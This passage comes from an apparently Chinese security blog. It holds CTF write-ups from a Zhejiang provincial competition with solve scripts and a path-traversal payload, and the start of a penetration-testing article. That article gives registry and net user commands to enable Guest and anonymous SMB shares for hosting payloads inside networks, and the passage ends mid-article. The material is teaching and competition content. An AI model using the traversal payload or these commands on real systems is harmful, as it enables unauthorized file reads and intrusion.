keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                    <span class="token keyword">for</span> i6 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                        <span class="token keyword">for</span> i7 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                            <span class="token keyword">for</span> i8 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                                <span class="token keyword">for</span> i9 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                                    <span class="token keyword">for</span> i10 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                                        result <span class="token operator">=</span> <span class="token punctuation">[</span>i1<span class="token punctuation">,</span> i2<span class="token punctuation">,</span> i3<span class="token punctuation">,</span> i4<span class="token punctuation">,</span> i5<span class="token punctuation">,</span> i6<span class="token punctuation">,</span> i7<span class="token punctuation">,</span> i8<span class="token punctuation">,</span> i9<span class="token punctuation">,</span> i10<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                                        m <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                                        sha3 <span class="token operator">=</span> <span class="token constant">SHA3_256</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                                        key <span class="token operator">=</span> sha3<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                                        dypher <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_ECB</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                                        <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                                            flag <span class="token operator">=</span> <span class="token function">unpad</span><span class="token punctuation">(</span>dypher<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                                            <span class="token keyword">if</span> flag<span class="token punctuation">.</span><span class="token function">startswith</span><span class="token punctuation">(</span>b<span class="token string">'flag'</span><span class="token punctuation">)</span> or flag<span class="token punctuation">.</span><span class="token function">startswith</span><span class="token punctuation">(</span>b<span class="token string">'DASCTF'</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                                                <span class="token function">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                                                sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                                        <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                                            pass</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>                                            </pre></td></tr><tr><td data-num="42"></td><td><pre>                                            </pre></td></tr><tr><td data-num="43"></td><td><pre>#b<span class="token string">'DASCTF&#123;b437acf4-aaf8-4f8f-ad84-5b1824f5af9c&#125;'</span></pre></td></tr></table></figure><p>运行得到 flag：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211110151834879-818252468.png" alt="" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly80eHdpMTEuZ2l0aHViLmlvL3Bvc3RzLzJlNTE2Njg0Lw==">本文参考 4WXi11 佬的省赛 WP</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省网络安全技能竞赛决赛部分WP</title>
    <url>/article/8d4c4fc4.html</url>
    <content><![CDATA[<p><strong>emmmmm, 暴打出题人，预赛和决赛就只会签到 QAQ！！！</strong></p>
<p>&lt;h2/&gt;Web&lt;/h2&gt;</p>
<p>&lt;h3/&gt; 远古特性 &lt;/h3&gt;</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Present from glzjin :)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^hint\/hint.txt$/m'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">Try</span> again<span class="token operator">!</span></span></pre></td></tr></table></figure><p>php 代码审计，正则表达式提示输入的参数得有 <code>hint/hint.txt</code>  才能成功。</p>
<p>因为正则表达式 /m 要换多行匹配，所以需要换行符；第一行通过第二行执行正则指令，换行符为 <code>%0A</code> 。</p>
<p>所以输入 <code>?file=hint/hint.txt%0A../../../../../flag</code>  得到提示：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>Warning<span class="token punctuation">:</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>hint<span class="token operator">/</span>hint<span class="token operator">.</span>txt <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">failed</span> to open stream<span class="token punctuation">:</span> No such file <span class="token keyword">or</span> directory in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">10</span></pre></td></tr></table></figure><p>表示文件未找到，继续加 <code>../</code> , 得到 flag：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172743483-1829736796.png" alt="" /></p>
<p>&lt;h2/&gt;RE&lt;/h2&gt;</p>
<p>&lt;h3/&gt; 最简单的逆向 &lt;/h3&gt;</p>
<p>附件 ida 打开， <code>f5</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172816940-1230999737.png" alt="" /></p>
<p>找到 for 循环后双击 enc 得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172841259-1429092771.png" alt="" /></p>
<p>将 enc 进行对比：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token literal-property property">enc</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172904036-1597899665.png" alt="" /></p>
<p>&lt;h2/&gt;Crypto&lt;/h2&gt;</p>
<p>&lt;h3/&gt;decode_and_decode&lt;/h3&gt;</p>
<p>附件下载<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172920368-1040902370.png" alt="" /></p>
<p>得到一堆 base 密文，根据题目提示一直解码试试，开始一直用工具在解密发现是 base 循环加密，脚本贴上</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">with</span> <span class="token function">open</span><span class="token punctuation">(</span>r<span class="token string">'decode_and_decode的附件22.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token literal-property property">f</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token literal-property property">f</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                pass</pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b32decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                pass</pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b16decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                pass</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#123;"</span> <span class="token keyword">in</span> <span class="token literal-property property">a</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr></table></figure><p>得到 flag：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101172946180-777354654.png" alt="" /></p>
<p>&lt;h2/&gt;MISC&lt;/h2&gt;</p>
<p>&lt;h3/&gt;site_log&lt;/h3&gt;</p>
<p>附件下载得到：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101173004885-1353201518.png" alt="" /></p>
<p>打开日志文件可以发现 attack 字样后有 chr 字符读取字样，将所有 chr 读取字符转换得到<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101173026723-9283991.png" alt="" /></p>
<p>一连串命令行，不难发现解压密码为</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>hehehe233_Igotroot！</pre></td></tr></table></figure><p>用 <code>WinRAR</code>  解压得到 flag：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101173047604-1999636297.png" alt="" /></p>
<p>&lt;h3/&gt;asoul_lover&lt;/h3&gt;</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>最近我旁边的灏妹天天上班第一句就是“Avaava”，还说要当安恒第一顶碗人。在他桌面上似乎发现了一个好康的压缩文件，想想他之前用过自己的名字<span class="token operator">+</span>生日来做压缩密码，这把应该也能破解出来咯？对咯，他的压缩软件支持中文密码。flag的格式为 <span class="token constant">DASCTF</span><span class="token punctuation">&#123;</span>xxxxxx<span class="token punctuation">&#125;</span>，提交时只需要提交括号内的字符串。</pre></td></tr></table></figure><p>文件信息结合附件可以找到压缩包密码为：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101173116603-1242333172.png" alt="" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>向晚<span class="token number">0612</span></pre></td></tr></table></figure><p>得到 flag:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211101173127023-1847943792.png" alt="" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透技巧——通过命令行开启Windows系统的匿名访问共享</title>
    <url>/article/4a3c5201.html</url>
    <content><![CDATA[<p>纪念一下今天圈子里提前过大年了！！！dddd，But 渗透依旧不能停啊！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210191626091.png" alt="image-20211210191626091" /></p>
<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<p>在渗透测试中，尤其是内网渗透，通常需要在内网开启一个支持匿名访问的文件共享，配合漏洞利用。</p>
<p>所以需要一种通用的方法，不仅要使用便捷，还要能够在命令行下运行。</p>
<p>这里通过 <code>win7</code>  进行实验。</p>
<h2 id="00x01-利用场景"><a class="anchor" href="#00x01-利用场景">#</a> 00x01 利用场景</h2>
<p>开启支持匿名访问的文件共享后，其他用户不需要输入用户名和口令，可以直接访问文件服务器的共享文件</p>
<p>通常有以下两种用法：</p>
<ol>
<li>作为数据传输的通道</li>
<li>配合漏洞利用，作为 Payload 的下载地址</li>
</ol>
<p>文件共享服务器需要能够在不同操作系统上搭建</p>
<p>对于 <code>Linux</code>  系统，可借助 <code>Samba</code>  服务搭建可匿名访问的文件共享服务器</p>
<p>这里给出 <code>Kali</code>  系统下的使用方法：</p>
<p>修改文件 <code>/etc/samba/smb.conf</code> ，内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span>global<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    map to guest <span class="token operator">=</span> test1</pre></td></tr><tr><td data-num="3"></td><td><pre>    server role <span class="token operator">=</span> standalone server</pre></td></tr><tr><td data-num="4"></td><td><pre>    usershare allow guests <span class="token operator">=</span> yes</pre></td></tr><tr><td data-num="5"></td><td><pre>    idmap config <span class="token operator">*</span> <span class="token operator">:</span> backend <span class="token operator">=</span> tdb</pre></td></tr><tr><td data-num="6"></td><td><pre>    smb ports <span class="token operator">=</span> <span class="token number">445</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span>smb<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    comment <span class="token operator">=</span> Samba</pre></td></tr><tr><td data-num="10"></td><td><pre>    path <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">tmp</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    guest ok <span class="token operator">=</span> yes</pre></td></tr><tr><td data-num="12"></td><td><pre>    read only <span class="token operator">=</span> no</pre></td></tr><tr><td data-num="13"></td><td><pre>    browsable <span class="token operator">=</span> yes</pre></td></tr></table></figure><p>开启服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>service smbd start </pre></td></tr><tr><td data-num="2"></td><td><pre>service nmbd start</pre></td></tr></table></figure><p>对于 <code>Windows</code>  系统，则需要考虑域环境和工作组环境。同时为了支持匿名访问，还需要开启 <code>Guest</code>  用户，允许 <code>Guest</code>  用户访问文件共享服务器的内容。</p>
<h2 id="00x02-通过界面开启可匿名访问的文件共享服务器"><a class="anchor" href="#00x02-通过界面开启可匿名访问的文件共享服务器">#</a> 00x02 通过界面开启可匿名访问的文件共享服务器</h2>
<h3 id="1启用guest用户"><a class="anchor" href="#1启用guest用户">#</a> 1. 启用 Guest 用户</h3>
<p><code>win+r</code>  打开运行窗口，运行 <code>gpedit.msc</code> ，打开组策略</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210192543319.png" alt="image-20211210192543319" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210192647745.png" alt="image-20211210192647745" /></p>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code> ，也即：计算机配置 -&gt; <code>Windows</code>  设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Accounts: Guest account status</code> ，设置为 <code>Enabled</code> ，即修改 “帐户：来宾帐户状态” 为 “禁止”。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210193010453.png" alt="image-20211210193010453" /></p>
<h3 id="2将everyone权限应用于匿名用户"><a class="anchor" href="#2将everyone权限应用于匿名用户">#</a> 2. 将 Everyone 权限应用于匿名用户</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Network access:Let Everyone permissions apply to anonymous users</code> ，设置为 <code>Enabled</code> ，即修改 “网络访问：将 <code>Everyone</code>  权限应用于匿名用户” 为 “禁止”，一般默认为禁用状态。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210194001996.png" alt="image-20211210194001996" /></p>
<h3 id="3指定匿名共享文件的位置"><a class="anchor" href="#3指定匿名共享文件的位置">#</a> 3. 指定匿名共享文件的位置</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Network access:Shares that can be accessed anonymously</code> ，设置名称，这里可以填入 <code>smb</code> ，即修改 “网络访问：可匿名访问的共享” 的名称为： <code>smb</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210195532578.png" alt="image-20211210195532578" /></p>
<h3 id="4将guest用户从策略拒绝从网络访问这台计算机中移除"><a class="anchor" href="#4将guest用户从策略拒绝从网络访问这台计算机中移除">#</a> 4. 将 Guest 用户从策略 “拒绝从网络访问这台计算机” 中移除</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;User Rights Assignment</code> ，也即：计算机配置 -&gt; <code>Windows</code>  设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 用户权限分配</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210195714536.png" alt="image-20211210195714536" /></p>
<p>选择策略 <code>Deny access to this computer from the network</code> ，即从 “拒绝从网络访问此计算机” 中，移除用户 <code>Guest</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210195833961.png" alt="image-20211210195833961" /></p>
<h3 id="5设置文件共享"><a class="anchor" href="#5设置文件共享">#</a> 5. 设置文件共享</h3>
<p>新建一个共享的文件夹名为 <code>smb</code> ，右键打开 “属性”，进入 “共享” 页面设置高级共享，共享名为 <code>smb</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210200155897.png" alt="image-20211210200155897" /></p>
<p>共享权限组或用户名为 <code>Everyone</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210200220448.png" alt="image-20211210200220448" /></p>
<p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为 <code>//&lt;ip&gt;/smb</code></p>
<h2 id="00x03-通过命令行开启可匿名访问的文件共享服务器"><a class="anchor" href="#00x03-通过命令行开启可匿名访问的文件共享服务器">#</a> 00x03 通过命令行开启可匿名访问的文件共享服务器</h2>
<h3 id="1启用guest用户-2"><a class="anchor" href="#1启用guest用户-2">#</a> 1. 启用 Guest 用户</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>net user guest <span class="token operator">/</span>active<span class="token operator">:</span>yes</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210201016794.png" alt="image-20211210201016794" /></p>
<h3 id="2将everyone权限应用于匿名用户-2"><a class="anchor" href="#2将everyone权限应用于匿名用户-2">#</a> 2. 将 Everyone 权限应用于匿名用户</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">REG</span> <span class="token constant">ADD</span> <span class="token string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> <span class="token operator">/</span>v EveryoneIncludesAnonymous <span class="token operator">/</span>t <span class="token constant">REG_DWORD</span> <span class="token operator">/</span>d <span class="token number">1</span> <span class="token operator">/</span>f</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210201045600.png" alt="image-20211210201045600" /></p>
<h3 id="3指定匿名共享文件的位置-2"><a class="anchor" href="#3指定匿名共享文件的位置-2">#</a> 3. 指定匿名共享文件的位置</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">REG</span> <span class="token constant">ADD</span> <span class="token string">"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters"</span> <span class="token operator">/</span>v NullSessionShares <span class="token operator">/</span>t <span class="token constant">REG_MULTI_SZ</span> <span class="token operator">/</span>d smb <span class="token operator">/</span>f</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210201104716.png" alt="image-20211210201104716" /></p>
<h3 id="4将guest用户从策略拒绝从网络访问这台计算机中移除-2"><a class="anchor" href="#4将guest用户从策略拒绝从网络访问这台计算机中移除-2">#</a> 4. 将 Guest 用户从策略 “拒绝从网络访问这台计算机” 中移除</h3>
<p>导出组策略：</p>
